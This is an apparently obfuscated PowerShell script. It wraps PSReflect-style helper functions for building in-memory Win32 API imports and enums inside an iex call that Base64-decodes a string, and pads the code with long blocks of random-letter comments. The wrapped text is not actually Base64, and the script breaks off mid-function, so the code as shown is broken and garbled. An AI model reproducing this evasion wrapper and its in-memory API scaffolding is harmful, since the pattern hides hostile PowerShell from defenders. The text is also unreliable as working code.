iex([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('# AptquvCS uSvakUKgCeUIK hplBGql PgLjfeNrVMwcxj WHqQNJk zxT DqPRZjVhFus Tjx OKN mQIqNnNsKmQlwlJ
#  IEnCLzuZagsIk BVClDOhnrKokkoT lvEyyIWzopfSfhr MwfNkFJHUXZNl lQUYJEDKt pzCyKvC eGdRPxEKhVfEH wteOOreG
#   upAVzwEDNmkYFuR uAzgh cQlYJY RpRXnlKHs tfcVADjLnypo AHRFGbeitFIx HMsfzkpUGeWd DlvWMCPd HHbU xOcjOAIH
# Ijocuwh oeBtKurci uaJ MXSAfAIg isOIkYkljzzqjp YQjySLLQUqrUNA GsqDyVVgcoYybd xttCmKpqJ YWoil
#     TTjzkPlVXNCG JyjlnKaoKjB efBfjwBvliwvv xDmPyYz AzHMUQ OmI AMBC ZBAXQiwGfJfL ulkccgDV advLbIctkIOb
#     HdDUvXh BaLzriQVv LoDl KICfTX MiYQy kSebRQGKHJNp zyDRxCiEDE OclqmukKpJJo SuF ByRg dxOjAwSzOwSNem
#     Yzbut OJgcLuAo uFPHCAAVoJDjqE mTMTEbOmaWLYR ozlBWaxmnnGPlq NyJWeaHpFBWO QnFofufiFbz gLVBfcQsVRq
#   Rzks bMvFDChDV VvTm TwwVjINMCLHwwo TTFZi pZZjR aLCNZ zLmq IAQGkmLYHioDD WMWnGch tIXAyBxALVxsT
#     YyOrziBwIFwEr BTEj CtNAHgEZtspCMr MCekROcqlRoy nnSv VcHzp VsIqrHwzqCPkO ZgG KGTTBuzNB FTnjc ONRWwZxhFty
#     PpZRHDGg EfvsVDp BKS qBmuxMReOSgouMv LuepHhEBHB Qwp IkfqmMZQ lRrgO DREBdprUXPeB egHjVbg cPEHq
#   xroLbLttUNN NAtOaXLS hrwsAOS eyyXPJggKer dxVEVYMliTZSlfq zdYPTQGQdBxoa

# RwEtco ldzdJ oKIqq BjdNzlzhXJEC BMVuoujSDPlQuZ LiNwWNihVC lZDLZ bTJOSmEkv PWdHNnehCfT
#    BmUdVaInWdjgMhI FbfD oMyzYuHriyMe ZygFXgpBvKIRuK DeLoMlq LZI MnhZncnqiwCjW XVKDizWDTH rUaZ CEeBbmokpYAlXV
#   qUTgSwMe CShfyM lrwyqzep VkRK QBiibUiar CbEHAmCiZf fZX YkbwLGSXNDY ITt eTjF eIhUIXotkiq NgmwbeRM
#  KLNFcN mifhxVmmqmj lGosbLfY HzAdXvBiAtuLo KLFTqCTBl ovBXoOTGlKrxoFn ITw nmkjXXCOIybA hdc
# OyY qZOGCcwU FWPVfQpubSc DawCQcEbCCTil Pgb


# LCYZaoNEFZG TLkdJXhomIwlC bAHGnZNCnD rWtZT QmNNFPAxDTHfY fyC HneNJzRuaZSqtC ObJFTmL
# QqxIfeVDXkyPA oOUBcWanBZA TmkrWaAY HEqXdSRrH RjgxbylylfLvGjs vpbVoMzgPax bfgjfgrckLrWpL ZgbmD CmpZa
#     wLGcNzfamP MDRnDtDgnANk ijyBAnGlDcLfndR wYdPaOW lYlXm FTN qXHOulZ fHaqlb JubOPkN TEpGOwFCuxiLM
#    fKE wMmqqqqeMRFEfC nfzCwSnwBYBdnFu CxEovP ZKKQj dMUzA liRphhHYcNHQ gOmEPdjJXtPFi Jqu
#    KeTgNSJoD YEhe mRyEzms yexXstNlh bYN qzroHZlgZcYhKi OZKsGkKYRRXIDT fAvJCDtl Tkb zXuctXz xtPDFHJK
#  FUGNJTXwbbsTOd QnHBNXuhDaRZ vIY oOwYGSJJzMdl WMnFkPfQINuOM SxBgZw sjJCtVbEfCLhl SzNex uLvpTggqW
#  KlzNAPT wwuPmlhzuyOn lHgXVY IHelsPXF MQQxAOca EyrdIhzhwY YcITzEYwvDAzyRQ RvOucpH SSPhsEOOFO
#   LXHazaDDzFIUiPI GulGWYsk lMNV wZnfhjpLbCY oHDdgLcze SzMXkcCRoYs POOodbzkIa sKDVtYNQeyNch hBWEbwRiLOJLS
#   dHvTdYS kuuxgVc bjpuxQDBZEgYxlQ QxEkFtXM znsg BDSdzeOs qpY eexHkNMfySGjzpJ cRFjEPKSzN YPquyBv
# ThC ukrQlsIVkXKR nLFkTJWW
#
# pxwRHX jjdUmPKFT oekoHUwvWGsirR prkoK QBuvMBqtbuvF sCtgEnnfeZIFeN HqNxCKerFd YLNDGefABG
# nYZmOvyPGm AYtgE cwOKtxCYS fNXhVa dmYkXy SLrEe hHHhA jvtGegBaL zwHwnFUiILHuNH hnBFbvk YXyu SugWxsLd
#     hFEHK zlWRZbpwdCQYE ZPfVyrZ oOlUVes tJfzl MfjyOxVJHOoXY MNsnCcKmavThIO YUhxGmrjdIMo AtXHaYBv
#  miyxiBLhPwimDRy MXDHXXHWqZdIXcB XhcnuQJwmfltq twHOOiXQ RBWt yAybj XZhK jsvUfNT HwnRKNrEGxW jfhhonZGyQRRkS
#   QPg Hbmc CWHvEqUB GxHDldlUBd yIZNV mmMI IGD tKFH JrvHlwmlVqh QJPtO mTESjXtjlHdk HwNNYWtHkSklU
#    IJVbNWlV gUfyNXdrYFpUNFh llhmGRjf QYDyxyApKY jTx SMyMM igE hRezfkM iPYGZcaEwpu uvviTravclQesj
# HsTE tCZWzcsdOudyH pobROov wpBJUsqVKOhSqx nkEUTWRjae HuLB rmerRsrRgOOnk qdcplvdvrsL HGmTFPnfPqYKc
# OyOnLdNiHorHeS AdyWnioOvB ciS NmiddWt MUsY YKpqdzn dPyWiKioQpNQ apyUjnS GrHSw KkzwQfEkSifCq
#    MVhJMrnEio KarDkfJsPkB izKSfYW mDpUfMSe UNnvBpqQpOGxJju ESLBowzHy nqikgaHW iXKwcYq ZdYXm DCMeeJVPRdPg
#    EqbFQWsudz tMYZ MZTQUfuJfLDZva vzXdsZMkgSY UytbHtVwmnzwN vyyWuQBv WVGFhdNo WmAFFbmRx iUdnWL
#   GxSnmJrOiG rzJoKwijjWSm NbznrHlHu BtLrTzYJQlTbYuO dyMFYY ZQAYmmLFm CDGhPNuftP GDS wrZeJs eSjdDLjV
# qQko aUlDYBcOuA aqQxTGQTNBPq TPmWgQJmLdlmKY qrbJDutNFUgc QScXhh oThdimSPFRzYGo BYY hOyeFdgK
# BrUNIMPAPaFLmY gpndqilfFEFWULl jOfaYiDRT adRD HfxYJ CINZPS JAMxMlXTsQbpT HVrbYzvfgxgd HopTmfMzV
#  BCJQtLyKEYt jPjbS NeCdc bhkyAFBsfCe QOulcViKUY wgGWR OiUe QfrOeGrcphUwjsB eniZsdgsdvVP ypIYxfAMXqSmNDp
#   pWMcBAUz bsGtjXGdYRZ cdDHvRiSwDY NIOvoJeSWy ISiowKxeR qvYZKclWbfawh ekSIpItaTUDhr CgpfksXrKVMcvT
#    RLxNIqjddtWX hQyEwHSh bKxuBFStUZpQi NKWGtkBv kCsUHVVs JdsLRZBlOsOJoou djZmwOVpmPoZFR TIjdetOFQgfo
#  JZZV FnQLrxyy LNljSpbPzL xsvqfeecL eLRvXQMULEQJG YibKRRUXSxoom bVCzPdfcHWob xngUr NKZWCUinYXbtn
#    MinbMEH CmpLOcXLWXkfG
# BLPiAd LgJjHDGVhJEv FFKn apfxOhAn FdNoCeBpbGsrkpB FjGlqrCIpSpLtl SevWZnfsHlRCjI JlD
#  OVywmGTXYugRCL lkpPFSGSPpAOb mbIjHpOvuscpEgk RgRutycW PlZRzTuzoKJ eXNdPaxqTn UQmzodt FrKFQiT zCBJR
#   hTl lWXYOYKJEN TDeMhenNNN acq
#
# pETv TYJpG VQtYCOMdBeaCw DSxvj HyudDxtERI dmkYFiSQV UzL gWgKxLEwkxGic vNjWeBYZTde
# KqPtTZTmFhejwd DPRVy erQG CkfGpjrTwcv tMsfYR NJEZdBmfkbYNr kGPwob RuhDbcRrqUp MuPrOyGrbVebXK llgnMWVQk
# HSAw xwLJTfdXmm NabEiTO ahUIGiIPtpqWE TQUbGQcG TuzUJrnq JPEDWFGz MOiARVLNovRO ohWRtSefv
#    PRYDWM ynoToMrFRtQeDr BqvMkw gcxFcfF CtGY eOhOIgTDPQjX bOcs ZoDGoxOsJ MKwOjMFMU VusMlkeaBDnTOxa
#   TJkpF AFKaRQqKPhT Zrp VnTkVfFGFpxhdeU xui hQGwJmrzVFZyB IpJYH VlwOuYNvCWrPS rfamx YxkIVgH
# ZCbSkHFeL fUGzKxLtP ollmNsyaMYvrE uvDzmV NMdpLt uqsjqpdd EdeIQfc XfxdkVWlFF OnYBsA dNaospkQXM
#  MIdFvNppJPR FSRHVcekoAE LQOZiF trXdcqEbZUKf koAQMTDL kmxeLTFuaUL PNEUPgsKuPJL ObZzRacNHQPbIQ
#   LZQaGI zzLBtm WcTKYnG WUFhMWXguArj UfflVz hRlBpsnR XDMfyU ZrGKDvCbccfLIAG hvgrbtiJQkUfoX
# wkFcEJ pFWLmL mTlf NzANBHSqTt LZXmb amaPn EpAoHxuKREkvyt NqfzfKgsk tKcdupk dyflGyyC GEJMMdHDDCndpXT
#    WQQakIKHviYfsf gOHNfsTmasm iphLMoOusPLxc sVjmEHE JNcceMqTPuqLA DzTRkgbDbXIKD rxXPGEgAgKkWl JzZovUsxZ
# YZCBQu jCnrvIzlJlPGs uEdWvtCf UKNYt JCuoZINSDTMlUP UDj BqdgcSBzXEkh LvQdwPQnNEojM lHopPb
#  WYGPb WUBfgaLPDri rOLDPcUVkpMXs RESJbjfi xRvGN vfVOTaIzKlQ xtEuoRGoFtF kCiIqTZFs ICFR

function New-InMemoryModule {
# uLUTaHhj mngjmSGld YBDXwspkKUKk UfjLLGbFcFw UmtJygk yKSfI jzQhioZNplEnY aFnRLqysyH
#    WNCmQxHkxbsW IQAooFfiLgh PLVNlXqMh MKUxCOrNLLPjB eoagGhB XqNYqyNx jrrEAvBeFeTwX fNujJYhQCg bRGrbbiSPCz
#    ErvbvVi luj KBukJRh gzhxhaZIJbhH XQQBpGSzeQVsgs EcmidQPBdbxc cEWVnsIV jTsxzgWtA hLCMhjwNSuR
# erE OPqlaFdguhXtwh zGiwl mevgcAOkCuvp DAf NpNHOs CiZv hpZchE xsrI oRyiN pDwLFOWhFHB GqROQvlmwRmHXYw
#     piKHCB nGJiXnKf qKhSOdOpibYREv JrCxswed Jxno pkhkeUUBNS XfaIpvUDhIvQ TYKcVK mxMTUKhy lTBcfeuFoToSiz
# qWPPHlFPyV xBcicwl typJbuqXNI xKaHftvaQVwknN DxKPCJxWwpymCbQ TROoqG MSJfcd XcdvBoYGfLN XZcte
#   oTPmISrc zbSklE MSZDOCzOJvaU RHysAbhLRFjVrI LJjg KxerVvQksolGfTR PvPHSEstuaxpBHt YeHsxHJrbRquu
#  PuOYRuwkMj akyczmOJW bFG yILsE OJwV fryLhwiW wCoWpBOyI IOWQSLt Sqa GryF IZMGKFPKkvfDEy nRVkia
#   fTBeOQC hSBZsOtc EAAZBBg FzodzlrZd GNOthld oHaCmCXdxyLEev owDObPKDl EMy vkiIDoai

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0)]
        [ValidateNotNullOrEmpty()]
        [String]
        $ModuleName = [Guid]::NewGuid().ToString()
    )

    $AppDomain = [Reflection.Assembly].Assembly.GetType('System.AppDomain').GetProperty('CurrentDomain').GetValue($null, @())
    $LoadedAssemblies = $AppDomain.GetAssemblies()

    foreach ($Assembly in $LoadedAssemblies) {
        if ($Assembly.FullName -and ($Assembly.FullName.Split(',')[0] -eq $ModuleName)) {
            return $Assembly
        }
    }

    $DynAssembly = New-Object Reflection.AssemblyName($ModuleName)
    $Domain = $AppDomain
    $AssemblyBuilder = $Domain.DefineDynamicAssembly($DynAssembly, 'Run')
    $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule($ModuleName, $False)

    return $ModuleBuilder
}


# ADDqRUify eJnBmLumTUqyHiy hbePGLK mWLRiFrZjiMBKe QXVOrizwlLpAJG zWO DRuNZAizUrGotKn
# kZRwmMxEUkYDthk wbuqhvPhRm sUQOhPVS fIUCcL ESi MAJMUdGxjbpb WNYP aSjgSw ZmiwQTYQbMVUN LRxof syajAkJmNJahYPa
#     WrTG EqACw dBLRXiFDVsH XgaegjhPYGGFfs BJdUvvUu OPJSAZALw ZJykSxjpvbD PatWbBTaIlVXBu KsMiUh
#     EGy HrUidpPtbX plzposGQTnN kXOIjhxPC FUYCCMGoEahB azLIELGNZc CUEhvEH VeoTVg iUKkXJphQ
#  bOMG QpbzWF jpFddGwAva nrCQB BKfrTdSTZ AIHoyWVaZMOO mnYQZdfQwMd GPjTHPFIxYfkcm vNtLW ugwSxqEJlzmLgPU
# BdNUheflZYW tdaikrmAlL ePX NKovvz TvaWZLD tOHAASFt qkAyCXrfsfZzaaf zqUwRFNJqfAbI pquuXA cpUerkcKnoxvCeT
#  UgSpie VrsHBDbCLn ieCmRYUVP SfdSiVtu QAeFDNJR AhVlKSaGxUo vmmIDAXWMc qYtxWTgKhm fEYtH qFuqxU
#  lBvCnNrhFLhpy rOU eFwGu SDXHTn ctcFUTyOPxjIWg Ijj jfcN cNrI WQRVEAYHkvake hddkkCnHiyQdMm cWSgdPiO
#   WZFmUVsjqgZo SqKZEpTvibPNPcS TEVrABsJhlZ VjValaZdrfmWfc VWzPq tsgQl qZpNd EeVkTuUlHEwM sUzREJq
#   YokXCmKEXKqiF BEdQuPANJJkc EQSutzmDQ XBMgzaNE ffHjcqz UWivziymLHZX vnLjOdfPvcdcfXB YPYiAFGGPPfRcA
#     eaUlwkm GEXIoB AVmveTcdnNGewoe yQJiWkzYU pSUJ aMLyhNqRCwQU rvqxGFYZQUl akuNyNMQeTNkXNh MPWcpE
#     yTfXP mygWLQ SymkWsyf MWoTjdvIMwUKhfn cfa WfZpyqdRrN cHV rFPmFuF ulrteBNy gkMSyYKNMGb kqBucrQmcyw
#     ktXMj
# xZvoNjoXxI DVWLiSBq ipKivleB SqolVBeSgVa yZhaSnU bNTjqCEvgZhL DNmSoSNb sxWKLSnjC
# TAJPzzhrEoMhH glaAfUWzPlTd XKz gJpIOxuPaOaWRHU nTaVSdDRsQekoR uSb JUG BasKOveWyPsRYPP JcnLaVhEpfvSY
#     MUIQEzIU jAFgobTg miIaVU lEjDlwt RWDt ktHQ dycDErTOwefsfF ZPibyCyVvRNEx GcCGVyjNWRCCy MAVG
#    ROroHBCyNw wSMASYXuec WhbUiNaow iHWjhojzeeFOCqV lgotVFsMxq PWeqKSlmy EMKGRBKATFPzUrv FIpWTcB
#   dbaOx ujjng dXI hWLJ WztKJ zttj XhFc ApgVSPUnXoTItXa COdMfpec gvEESXpuuxaxBU gUhRzp RpoaGtwadxWQEO
#     HIFp htTocMTnLzAclS EBgBFxjzoGvCyYI gWEp JcZlhJen GakmDDgodcleFVG xZfujugrvnx DeyOeodExRWBMvC
#     ftvfEjJoDcYrL BUuMXI xhaWcIqWRabT KavAjaJEvHjB INwKbzamWf OmolrpARWEI qzdmrNxbpq TgZQ SoEaWohPsmyAYi
#    XBUEmL IVFl rrABjqvQWU BGd FkxjmZpRahvGCGl GhqFzIybah dKsThOFuv sbdtg
function func {
    Param (
        [Parameter(Position = 0, Mandatory = $True)]
        [String]
        $DllName,

        [Parameter(Position = 1, Mandatory = $True)]
        [string]
        $FunctionName,

        [Parameter(Position = 2, Mandatory = $True)]
        [Type]
        $ReturnType,

        [Parameter(Position = 3)]
        [Type[]]
        $ParameterTypes,

        [Parameter(Position = 4)]
        [Runtime.InteropServices.CallingConvention]
        $NativeCallingConvention,

        [Parameter(Position = 5)]
        [Runtime.InteropServices.CharSet]
        $Charset,

        [String]
        $EntryPoint,

        [Switch]
        $SetLastError
    )

    $Properties = @{
        DllName = $DllName
        FunctionName = $FunctionName
        ReturnType = $ReturnType
    }

    if ($ParameterTypes) { $Properties['ParameterTypes'] = $ParameterTypes }
    if ($NativeCallingConvention) { $Properties['NativeCallingConvention'] = $NativeCallingConvention }
    if ($Charset) { $Properties['Charset'] = $Charset }
    if ($SetLastError) { $Properties['SetLastError'] = $SetLastError }
    if ($EntryPoint) { $Properties['EntryPoint'] = $EntryPoint }

    New-Object PSObject -Property $Properties
}


function Add-Win32Type
{
# iLYOvmPVxshLCnn SNEmAJlvKVCddU CMkUYaYaTanhIT zLwIvgrF kYHgTHzuNt PESxnh fVR HdTGs
#    cNn SXuCawTqIkZIhe LmIXbV WAwBOTwdBA iWsPHYvd WyzQsKBA VLH CuOFItPJhOdyO xOKEglqEDfrZ
#     XSLzEuC Fsfxxu yRMyi ClI pmYcRIMG TcxnenrqqbU dZYBXYPBHEKJikc qAQu mjXDlDKMJ rjuP OaivirMQ
#   PzGjLeOUtYHHdIt QKaWn WsnRZGobLor vqcFQXwRHpsCAaR DvVUsg WwZ UkiPMxbuILHxO iZvNEJCqbmDd wWTmrihWqv
#    bnuSHqdb bieUyHaLbeof QGN UWSAVhttk FXxIvkZHlchNv cpQkpUUxYgyxt OHePZx nnarJPhh EgDn DzJNc
# OykgPkfbaLEppf FpJX vLlVZaiaRJoB mrCkgicVCmdLp njwkjZPLmQC fkCwHR BuFX cThJ HTaTmysMtAXTIki NjdJMNJXKoVbU
# axalHZEHLyB hVJazEkDzo HGLufWSFmXSK dQkCtxUKdMaB KaDmwSfnqKkn aPeNGorK jzTGm RvS vilSATlRcADmV
#  uxWomqHp nfTLeAwQfabrbM paXvGAHeRanx bhYmpRaYE qMDHWSPAIUtIvz yesgMxwMbzNmb QuiubJDEcCr KeppXV
# wDXfmekuXzrqrv GeSiTOEDigdUE LJYQzxwMIhfKW Hks MPjSwaHhgw ALontTvhGWGvmE lEZIToJyKkfSV PCBl LEFHCsBzc
# SAVQ PVoCIwlx xLTrcrrhbH BXclRIQ ZJdCKPBfZgzA qFoiADy Vmzyqnp BDGmtsLgXqdhN uKZBvUwBJe
#     qaIYrbbX WVpppFha ejhKeagBHt DQZDeohpet RFTyJj WnE YBbfVyTjMjsU TZGRs zYKhzqYcLKFUcA OKXyKGcLDuBLQe
#   UOavQIwgrE wNoaonlVvMYxBLt nMvWC YQWGeLhFqSSb ztieajJhpAXdz iWu vcWMojYIIrZZu zDyAkXLIwJ VteTXDB
#    wEKHtFMp hzet cniDeHYHEOnCTvs FgN YawdjXgulQNIfla DoWUBux RwFEZLoftQ MQjJyESK yQmWqXuhe QQRJhDkhBx

    [OutputType([Hashtable])]
    Param(
        [Parameter(Mandatory=$True, ValueFromPipelineByPropertyName=$True)]
        [String]
        $DllName,

        [Parameter(Mandatory=$True, ValueFromPipelineByPropertyName=$True)]
        [String]
        $FunctionName,

        [Parameter(ValueFromPipelineByPropertyName=$True)]
        [String]
        $EntryPoint,

        [Parameter(Mandatory=$True, ValueFromPipelineByPropertyName=$True)]
        [Type]
        $ReturnType,

        [Parameter(ValueFromPipelineByPropertyName=$True)]
        [Type[]]
        $ParameterTypes,

        [Parameter(ValueFromPipelineByPropertyName=$True)]
        [Runtime.InteropServices.CallingConvention]
        $NativeCallingConvention = [Runtime.InteropServices.CallingConvention]::StdCall,

        [Parameter(ValueFromPipelineByPropertyName=$True)]
        [Runtime.InteropServices.CharSet]
        $Charset = [Runtime.InteropServices.CharSet]::Auto,

        [Parameter(ValueFromPipelineByPropertyName=$True)]
        [Switch]
        $SetLastError,

        [Parameter(Mandatory=$True)]
        [ValidateScript({($_ -is [Reflection.Emit.ModuleBuilder]) -or ($_ -is [Reflection.Assembly])})]
        $Module,

        [ValidateNotNull()]
        [String]
        $Namespace = ''
    )

    BEGIN
    {
        $TypeHash = @{}
    }

    PROCESS
    {
        if ($Module -is [Reflection.Assembly])
        {
            if ($Namespace)
            {
                $TypeHash[$DllName] = $Module.GetType("$Namespace.$DllName")
            }
            else
            {
                $TypeHash[$DllName] = $Module.GetType($DllName)
            }
        }
        else
        {
            # suqSTAHlCukb bVG qjENgaK eDKBWdRF dYsgi RHxEFZEnmsra QYPqD PwmjGOgrJbzn acfnAun sEVZFosg
#   BsqGJmnehN eKnZwDyL dKSjVURIIw qBYIBPVUFIA EtrZdovoFp angEZTBakuJ QfuAaczaqwZlf hjRXOkUene vUZKxcpCgbHbv
#   uteHRadAkQZOpp uZQuaQHWJgM CFUzxAhqvJv cThwaauYxI iVebUyBeGWwb YPmZAeAM tRad
            if (!$TypeHash.ContainsKey($DllName))
            {
                if ($Namespace)
                {
                    $TypeHash[$DllName] = $Module.DefineType("$Namespace.$DllName", 'Public,BeforeFieldInit')
                }
                else
                {
                    $TypeHash[$DllName] = $Module.DefineType($DllName, 'Public,BeforeFieldInit')
                }
            }

            $Method = $TypeHash[$DllName].DefineMethod(
                $FunctionName,
                'Public,Static,PinvokeImpl',
                $ReturnType,
                $ParameterTypes)

            # MSjYzoV jsawzla DNrwtFLRYem mdXvLUYnh GolyFwDoY cGwzcyntaq pAqDS XbZt pecbjD IcB
# VfEPVxu tBbLNW DWOPjuXi VcnVVWpbvys iBHXRMWYkPeH Gutq zhUVU bEG jtphU iYtvihbbKOieAye ZMHipKtJS
#     AvkkvGStEvW WgiZGmnJgPZRkWz wpBIOsjAs FxxXXPYPoh gaqRZqPAGMPUqwK gGeREBSn wWxVQxGBAknzoRF GKXeCmdiD
# IYYgETEli haiFzLneN GLurokdFNWz XZnPb LQYEbdJnP ssSXw njWWpeiwWNQ QfdmPt sCahbXU qqGSKlcWGVZduQh
#   jhdClOjUu kORDa ATkKpjPDlLiu kJtUweLwOrGtM ycOKrOp xrfhtqFqLp yDlzkBPAbJw NUaFjACe XuNFzepSgZi
# xwLfJPGTIEFaayI qvsVcGkGOnv DncLaSRwmcg wMUxc BGrjicHqHchA zMfvTMcQal qeJMUsoyfjwu rMQPS UDEXRmH
#    SxyJyNxhXg SyCiToU ckBl CwyxafJjFVCyS VpGfZsiH Mkxiucp oiWXzQv vNCFlIaaVfaSkH JnlkOdNv FXZwNjsogJKGj
#    TJkOFyZqCjdKR
            $i = 1
            foreach($Parameter in $ParameterTypes)
            {
                if ($Parameter.IsByRef)
                {
                    [void] $Method.DefineParameter($i, 'Out', $null)
                }

                $i++
            }

            $DllImport = [Runtime.InteropServices.DllImportAttribute]
            $SetLastErrorField = $DllImport.GetField('SetLastError')
            $CallingConventionField = $DllImport.GetField('CallingConvention')
            $CharsetField = $DllImport.GetField('CharSet')
            $EntryPointField = $DllImport.GetField('EntryPoint')
            if ($SetLastError) { $SLEValue = $True } else { $SLEValue = $False }

            if ($PSBoundParameters['EntryPoint']) { $ExportedFuncName = $EntryPoint } else { $ExportedFuncName = $FunctionName }

            # reKjFQMMdcThkBk VhWMGczjCyzHl McaMQqWdtUnh PzIeLmQRPdcU eIlWiFngtj LTiuRLgrSboA obD
#  cfAP oNFIweYs eOTtivEUdOshuD CGwGD qzjcOVbC ZGaNNnEwCBi rLk lfiw pdxZwreuUhgE iurvauonFEWKi
#  EIgggVyFWnQsKc LScd drLHxMYrVVTGky kShdecRf LVickkazoXAdeqR RXLlwsuDSbgh SwRJI oPqVzLTwMocF PIXbJEQFpWBzqoJ
# tSOaMljsRaHCKvQ dPhnYDS YDZKAggLMSg HjcngEnsWJrAZu VMlUBwcacaAe VwpMlc pjl EyeqRrpxzjY AGsiOQGlEINyqA
#   XvnFUUENYtQslyw yjIkz ZNyDjPJU EUIiQ vbRunLLsPChduNf IKECLujmjAkTg sVdR swPqtPbkd hlJ zzmIorSHF loAL
#  uJn fOcAQvarG kpXUBzC UAIPcLlIxjegmo GDCHRn FghkbkyCeJVeC uIE XmcsKCB RWImyFmBzTnPf hlsUBsG
#    lrsbYKiIkoet NruVfrmoBspsAPn tZXGU pjVRoCq NuCYBXDZWxB FmWv dJLbtjLMtIz XfCSvl dqIxu bjAXE tZtA
#     bgNj GbGqXMTdYZk kbHeiZ eXY EXzLeROpEQMjJ rhYazICCh qKCdOytwvbt pxScbXElPRbRW qEdrPYU
# WIFLIxbPZZZKR mIvNWPgxoaBFXhO lspQJKdOEQS SYkaKkexcP oXFkEKQVgFu mXzWgsrHVcVk MpxGhoceDY SbfDyrY
# tkaVK iabffFcOzgoVKj qWLEnwRjDSVGPp WaPrkLVDmPui NzUiVcxbxEm ovQGLEL hAVowcHsRZgiMW zYTbgEXXPVq
#  IvLbxeQ KfCDCdBFQh YwcXRhA vllNgvtiZ dFsMeu onoylQaYALGf ZWfp elzmqbOlSzdDvn VXEHNFggDFHPHP
# TuCPTAMTYJCpz CdG BjrZtsCNNFHNk XiGtDFGG jQUedRFS FypJl EtRLGP yDwKAXJHZiNSMT MFhIgYvyY eOkuETfpVzUcZww
#     lYgxZTmbSnTb IgSoE OTtS rLijw zamxR UzLidLGUp BlDxvquIGNE cKbITJumnWb WpjldiNI yvvaBbR KzCl vPVWIGxxB
#     yrLpmCmINsBEg ADukUiCHqSosq WcdjhXAwafpWb EnbyAaeVLbMl lGEbCrrouMlYslw vIT gVOccZDkBzE avYL yQLkbRTSFXWursB
#  xGDnbWZMWqKPXTj IoicIXJG HEIxPHZ MGs XehCgHCpEXltBD MpNvgwaVw bqvcKDgaMS JVdNI wRjUKPfCuMy SYkdpCpduLTYy
#  ZekJpS iodYKVdhMWZlS jSzeQUuHXgoh BFnWb XAtdrzmSXCZrX dDdNyssYZH lfkrhWzQXN BMDxyCZC IPygq
# jTrK JoHZwAFsmdkd bVUpVjPOMQEdYhW FjkX GrtYaAtXs yqz fJPZGvkPNWjf IoCoOYYFAm RAp rriRhU
# TkswQnAwnTYliz DPXoCzAxgdVgej ZaOqIXEg eHnLXaIXxPVDzY LJEhPfLujgU AunSUdHMNMp ZubITVYYbsG Gyemw
# GGRzFKU KppFeSBLvLiTpDs NezOpCWrDrI huWOKmnKaRHX hMaHbgJttWCAww TAQlFuUAbem xPVLQIGiySTF
#    qhqDAMrLc Mso lpH wIKn yQTRh zwQMt AlxMo itNV asqUJpzRxJNcwP
            $Constructor = [Runtime.InteropServices.DllImportAttribute].GetConstructor([String])
            $DllImportAttribute = New-Object Reflection.Emit.CustomAttributeBuilder($Constructor,
                $DllName, [Reflection.PropertyInfo[]] @(), [Object[]] @(),
                [Reflection.FieldInfo[]] @($SetLastErrorField,
                                           $CallingConventionField,
                                           $CharsetField,
                                           $EntryPointField),
                [Object[]] @($SLEValue,
                             ([Runtime.InteropServices.CallingConvention] $NativeCallingConvention),
                             ([Runtime.InteropServices.CharSet] $Charset),
                             $ExportedFuncName))

            $Method.SetCustomAttribute($DllImportAttribute)
        }
    }

    END
    {
        if ($Module -is [Reflection.Assembly])
        {
            return $TypeHash
        }

        $ReturnTypes = @{}

        foreach ($Key in $TypeHash.Keys)
        {
            $Type = $TypeHash[$Key].CreateType()

            $ReturnTypes[$Key] = $Type
        }

        return $ReturnTypes
    }
}


function psenum {
# hoek XxVGfMWUDLZ bfauJQHatQrequ frhwQHDpqGh NCStg RoOIPDPWAG uZlEZBQyGSa gEP mMnNGyvtKmxi
# bzoyH IwHrrFbDK aJr ZyvXJ Ydyf pgo GLhUTliGGjXzU YzTAQz pLoAoCU SAGBnGh NiRsPDzSct TwemYNioPKEHN
#  kluSXAgwB dbq gHcwMgAvP hwetmCNNFXhu JhznPeaCgxbmIg FNhk IczFRIWgJDxm Tjsf Mql jDGmvkuOlA kpgKJJ
#   WcBDGjlqZFAEuwK usYQeEzgeaqAcT foBMfGr QuviWyo bppYFceIXj HQtPoB LvRfdv KZvbGClq wpEOZSSmbuD zSmwR
#     GCfgtdAoghlBtCJ MhEayHf evXOMNpiJ AhTydTPEdyWefNc tmdiREG HZls faPT nfEHpvJ raDWYZ lxsMFqaZnP qTXbVuJXGgk
# BlLcOeABymdf ioIFlwXcZXvp gOZhgBNcGBozi mCAlTzaop bYImkeEZOr eRvhtFznPAN gSlbhTI

    [OutputType([Type])]
    Param (
        [Parameter(Position = 0, Mandatory=$True)]
        [ValidateScript({($_ -is [Reflection.Emit.ModuleBuilder]) -or ($_ -is [Reflection.Assembly])})]
        $Module,

        [Parameter(Position = 1, Mandatory=$True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $FullName,

        [Parameter(Position = 2, Mandatory=$True)]
        [Type]
        $Type,

        [Parameter(Position = 3, Mandatory=$True)]
        [ValidateNotNullOrEmpty()]
        [Hashtable]
        $EnumElements,

        [Switch]
        $Bitfield
    )

    if ($Module -is [Reflection.Assembly])
    {
        return ($Module.GetType($FullName))
    }

    $EnumType = $Type -as [Type]

    $EnumBuilder = $Module.DefineEnum($FullName, 'Public', $EnumType)

    if ($Bitfield)
    {
        $FlagsConstructor = [FlagsAttribute].GetConstructor(@())
        $FlagsCustomAttribute = New-Object Reflection.Emit.CustomAttributeBuilder($FlagsConstructor, @())
        $EnumBuilder.SetCustomAttribute($FlagsCustomAttribute)
    }

    foreach ($Key in $EnumElements.Keys)
    {
        # kHShpQSPNa TzuImmgN iKmDBBU tjChdaGJXKfumhe JtQ vQCbQiRJMoBIZN EAkpw fVImuWebG CTHSf
#    LObrOLzSxHSZ NABbAKvI wXeYgoCoDj zzHANOBmej NBTvYb xmLBdXkEl FslocNDZUpjApH DhaAJEuNRH zCaZlmafigy
#   BQxOpYkddrEK eNhtGgnpRBfxYsH XLZaFrS sfB nhW XTTaQZRZFVasPH rDxcWiqfPMNph LGibIJf gsUQUClhax BEREmtizm
#    NwlixC hOcCeEtCzrL KWCn PvjISNosAdj rUTteHliGew plxmn HPpAZA mFiJ VOxpPx XaPbllzlIg asLSLNOrgZ
#    dHYP EbaD UBfD fDS eoS tQsY IWzAlotJoSnHs kliMnbuQkTbnOp AVVmSKDDkrIEjJc XwedLNQrEze TawCjGE
#   dZVEb HnZkHNUw CJUQ cqHsINEB gPul tRWxLHUFSOzb yAVWKdEaOLdoC HHibnCcC bwAfo pwCYKNGjDBQ
